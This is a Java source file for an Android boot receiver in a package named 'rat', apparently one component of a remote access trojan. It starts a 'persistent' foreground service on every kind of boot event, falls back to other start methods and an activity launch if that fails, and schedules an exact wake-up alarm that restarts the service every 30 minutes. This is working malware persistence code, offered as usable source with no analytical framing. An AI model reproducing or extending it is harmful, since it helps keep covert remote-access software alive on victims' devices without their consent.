package com.fly0rakoon.rat.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received broadcast: " + action);

        // Check for all possible boot completed events
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Intent.ACTION_REBOOT.equals(action) ||
            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

            Log.d(TAG, "Boot detected, starting service with delay...");
            
            // Add a small delay to ensure system is ready
            new android.os.Handler().postDelayed(() -> {
                startForegroundService(context);
            }, 5000); // 5 second delay
        }
    }
    
    private void startForegroundService(Context context) {
        Intent serviceIntent = new Intent(context, ForegroundService.class);
        serviceIntent.setAction("START_PERSISTENT_SERVICE");

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For Android 8.0 and above, use startForegroundService
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Started foreground service (Android O+)");
            } else {
                // For older versions
                context.startService(serviceIntent);
                Log.d(TAG, "Started service (pre-Android O)");
            }
            
            // Schedule an alarm to restart service periodically (optional)
            scheduleServiceRestart(context);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting service after boot: " + e.getMessage());
            
            // Try alternative method
            tryAlternativeStart(context);
        }
    }
    
    private void tryAlternativeStart(Context context) {
        try {
            Intent serviceIntent = new Intent(context, ForegroundService.class);
            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d(TAG, "Alternative start succeeded");
        } catch (Exception ex) {
            Log.e(TAG, "Alternative start failed: " + ex.getMessage());
            
            // Final attempt - try to start via activity
            try {
                Intent launchIntent = new Intent(context, Class.forName("com.fly0rakoon.rat.MainActivity"));
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(launchIntent);
            } catch (ClassNotFoundException e) {
                Log.e(TAG, "Could not find MainActivity class");
            }
        }
    }
    
    private void scheduleServiceRestart(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                android.app.AlarmManager alarmManager = 
                    (android.app.AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                
                Intent alarmIntent = new Intent(context, AlarmReceiver.class);
                android.app.PendingIntent pendingIntent = 
                    android.app.PendingIntent.getBroadcast(
                        context, 
                        0, 
                        alarmIntent, 
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT | 
                        android.app.PendingIntent.FLAG_IMMUTABLE
                    );
                
                // Schedule restart every 30 minutes
                long interval = 30 * 60 * 1000; // 30 minutes
                long triggerTime = System.currentTimeMillis() + interval;
                
                if (alarmManager != null) {
                    alarmManager.setExactAndAllowWhileIdle(
                        android.app.AlarmManager.RTC_WAKEUP,
                        triggerTime,
                        pendingIntent
                    );
                    Log.d(TAG, "Scheduled service restart alarm");
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to schedule alarm: " + e.getMessage());
            }
        }
    }
}
